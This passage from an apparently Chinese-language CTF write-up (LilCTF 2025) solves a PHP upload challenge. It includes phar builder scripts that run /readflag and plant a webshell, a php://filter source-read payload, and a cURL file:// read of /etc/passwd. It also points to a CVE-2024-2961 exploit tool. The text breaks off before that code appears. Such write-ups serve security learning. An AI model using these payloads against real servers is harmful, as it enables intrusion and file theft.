</span></span><span class="line"><span class="cl">    <span class="nv">$orig</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file://&#39;</span><span class="o">.</span> <span class="nv">$orig</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// I hide a trick to bypass open_basedir, I&#39;m sure you can find it.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;&lt;?&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;halt&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;å­˜åœ¨ `&lt;?` æˆ–è€… `php` æˆ–è€… `halt` æ¶æ„å­—ç¬¦!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°è¿™includeä¸æ–‡ä»¶ä¸Šä¼ è”æƒ³åˆ°includeè¿™pharæ–‡ä»¶rceï¼Œä½†æ˜¯é¢˜ç›®è¿˜æ£€æµ‹pharæ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥gzipå‹ç¼©ä¸€ä¸‹(æˆ‘è¿™é‡Œæ˜¯ä»£ç å‹ç¼©ï¼Œè™šæ‹Ÿæœºå‹ç¼©ä¹Ÿè¡Œ)ï¼Œç„¶åflagåœ¨/readflagé‡Œé¢ã€‚</p>
<p><a class="link" href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/"  target="_blank" rel="noopener"
    >å½“includeé‚‚é€…pharâ€”â€”DeadsecCTF2025 baby-web â€“ fushulingã®blog</a>ï¼ˆæ³¨æ„ï¼Œ<strong>è¿™é‡Œincludeè§£æpharåªæœ‰æ–‡ä»¶åå«pharå°±è¡Œ</strong>ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;exp.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">compressFiles</span><span class="p">(</span><span class="nx">Phar</span><span class="o">::</span><span class="na">GZ</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;&#39;</span><span class="dl">STUB</span><span class="s">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s">    system(&#39;/readflag&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s">    __HALT_COMPILER();
</span></span></span><span class="line"><span class="cl"><span class="s">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="dl">STUB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$stub</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">gzopen</span><span class="p">(</span><span class="s2">&#34;exp.phar.gz&#34;</span><span class="p">,</span> <span class="s1">&#39;w9&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">gzwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;exp.phar&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">gzclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯æ²¡ååº”ï¼Œå°†å‘½ä»¤æ”¹æˆphpinfo();å‘ç°disable_classesä¸disable_functionså¤ªå¤šäº†ï¼Œæ ¹æœ¬åœ¨è¿™æ‰§è¡Œä¸äº†å‘½ä»¤æ‹¿flagã€‚</p>
<p><img src="/p/2025-lilctf/image-20250907152652546.png"
	width="729"
	height="879"
	srcset="/p/2025-lilctf/image-20250907152652546_hu_9ef499fcf2c4547d.png 480w, /p/2025-lilctf/image-20250907152652546_hu_f8f43af359aee9f.png 1024w"
	loading="lazy"
	
		alt="image-20250907152652546"
	
	
		class="gallery-image" 
		data-flex-grow="82"
		data-flex-basis="199px"
	
></p>
<p>å‘ç°evalï¼Œfile_put_contentsæ²¡ç¦ï¼Œä¸ºäº†æ–¹ä¾¿è¯•æ›´å¤šå‘½ä»¤ï¼Œå…ˆå†™ä¸ªé©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;exp.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">compressFiles</span><span class="p">(</span><span class="nx">Phar</span><span class="o">::</span><span class="na">GZ</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;&#39;</span><span class="dl">STUB</span><span class="s">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s">  $filename=&#34;/var/www/html/2.php&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s">  $content=&#34;&lt;?php eval(\$_POST[1]);?&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s">  file_put_contents($filename, $content);
</span></span></span><span class="line"><span class="cl"><span class="s">        __HALT_COMPILER();
</span></span></span><span class="line"><span class="cl"><span class="s">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="dl">STUB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$stub</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">gzopen</span><span class="p">(</span><span class="s2">&#34;exp.phar.gz&#34;</span><span class="p">,</span> <span class="s1">&#39;w9&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">gzwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;exp.phar&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">gzclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>includeèƒ½ç”¨ï¼Œä½†æ˜¯æœ‰open_basediré™æ­»äº†è®¿é—®è·¯å¾„ï¼ˆphpinfoæœ‰ï¼Œé¢˜ç›®ä¹Ÿè¯´äº†ï¼‰</p>
<p><img src="/p/2025-lilctf/image-20250907160422522.png"
	width="680"
	height="71"
	srcset="/p/2025-lilctf/image-20250907160422522_hu_3b60858e4a24cdc7.png 480w, /p/2025-lilctf/image-20250907160422522_hu_95abbea5241c5431.png 1024w"
	loading="lazy"
	
		alt="image-20250907160422522"
	
	
		class="gallery-image" 
		data-flex-grow="957"
		data-flex-basis="2298px"
	
></p>
<p>çœ‹ä»£ç è¯´éšè—äº†ä¸œè¥¿å¯ä»¥ç»•è¿‡open_basedirï¼ŒåŒ…å«ä¸€ä¸‹index.phpçœ‹çœ‹å®Œæ•´ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1=include(&#39;php://filter/convert.base64-encode/resource=index.php&#39;);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-lilctf/image-20250907153947878.png"
	width="1502"
	height="308"
	srcset="/p/2025-lilctf/image-20250907153947878_hu_9acbffc6e78801a7.png 480w, /p/2025-lilctf/image-20250907153947878_hu_5d9ef70109171111.png 1024w"
	loading="lazy"
	
		alt="image-20250907153947878"
	
	
		class="gallery-image" 
		data-flex-grow="487"
		data-flex-basis="1170px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/tmp/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;æ–‡ä»¶å·²ä¸‹è½½: &lt;a href=&#39;?down=</span><span class="si">$file_name</span><span class="s2">&#39;&gt;</span><span class="si">$file_name</span><span class="s2">&lt;/a&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;ä¸‹è½½å¤±è´¥ã€‚&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;down&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s1">&#39;/tmp/&#39;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;down&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ä¸Šä¼ æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/tmp/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$orig</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file://&#39;</span><span class="o">.</span> <span class="nv">$orig</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_PROTOCOLS_STR</span><span class="p">,</span> <span class="s2">&#34;all&#34;</span><span class="p">);</span> <span class="c1">// secret trick to bypass, omg why will i show it to you!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;&lt;?&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;halt&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;å­˜åœ¨ `&lt;?` æˆ–è€… `php` æˆ–è€… `halt` æ¶æ„å­—ç¬¦!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°æ˜¯å¤šäº†ä¸€ä¸ª<code> curl_setopt($ch, CURLOPT_PROTOCOLS_STR, &quot;all&quot;);</code>æ„æ€å°±æ˜¯<strong>å…è®¸ cURL ä½¿ç”¨æ‰€æœ‰æ”¯æŒçš„åè®®</strong>ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨file://è¯»ä»»æ„æ–‡ä»¶ç»•è¿‡<code>open_basedir</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file:///etc/passwd&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_PROTOCOLS_STR</span><span class="p">,</span> <span class="s2">&#34;all&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-lilctf/image-20250907163020663.png"
	width="1494"
	height="550"
	srcset="/p/2025-lilctf/image-20250907163020663_hu_38eec6eca5335063.png 480w, /p/2025-lilctf/image-20250907163020663_hu_90210914da7908f5.png 1024w"
	loading="lazy"
	
		alt="image-20250907163020663"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="651px"
	
></p>
<p>ä»»æ„è¯»æ–‡ä»¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿæ€æ ·æ‰èƒ½æ‰§è¡Œ/readflagï¼Ÿçœ‹åˆ° <code>file_put_contents</code>,æƒ³åˆ°<strong>cve2024-2961</strong>ï¼Œè¦åˆ©ç”¨è¿™ä¸ªï¼Œéœ€è¦è¯»åˆ°/proc/self/mapså’Œlibc.soâ½‚ä»¶ï¼Œè¿™å°±ç”¨åˆ°äº†ä¹‹å‰çš„ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<p><a class="link" href="https://blog.csdn.net/2301_80915592/article/details/146151596?spm=1011.2415.3001.5331"  target="_blank" rel="noopener"
    >GHCTF-web-wp_ghctf2025 goph3rrr-CSDNåšå®¢</a></p>
<p>å…ˆè¯»/proc/self/mapsï¼Œå¾—åˆ°libc.so.6ä½ç½®,è¿™ä¸ªæ–‡ä»¶bpå¯¼å…¥å°±è¡Œ</p>
<p><img src="/p/2025-lilctf/image-20250907164030664.png"
	width="1893"
	height="553"
	srcset="/p/2025-lilctf/image-20250907164030664_hu_33f2c80d1b614e4.png 480w, /p/2025-lilctf/image-20250907164030664_hu_fc500497de9d056d.png 1024w"
	loading="lazy"
	
		alt="image-20250907164030664"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="821px"
	
></p>
<p>è¯»/usr/lib/x86_64-linux-gnu/libc.so.6</p>
<p><img src="/p/2025-lilctf/image-20250907164740982.png"
	width="1905"
	height="642"
	srcset="/p/2025-lilctf/image-20250907164740982_hu_2dd034175e2f27ee.png 480w, /p/2025-lilctf/image-20250907164740982_hu_5f4d7ccf31af04c.png 1024w"
	loading="lazy"
	
		alt="image-20250907164740982"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="712px"
	
></p>
<p>è¿™æ–‡ä»¶ä¸ç”¨ç›´æ¥bpå¯¼å…¥ï¼ˆä¸ç„¶ä¼šè¯†åˆ«é”™è¯¯ï¼‰ï¼Œå…ˆå…¨é€‰ç”¨burpå»base64ç¼–ç ï¼Œç„¶åæ”¾åˆ°å¨å­è§£ç ç„¶åä¿å­˜æ–‡ä»¶ã€‚</p>
<p><a class="link" href="https://github.com/kezibei/php-filter-iconv"  target="_blank" rel="noopener"
    >https://github.com/kezibei/php-filter-iconv</a></p>
<p>ç”¨è¿™é¡¹ç›®ç›´æ¥æ‰“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
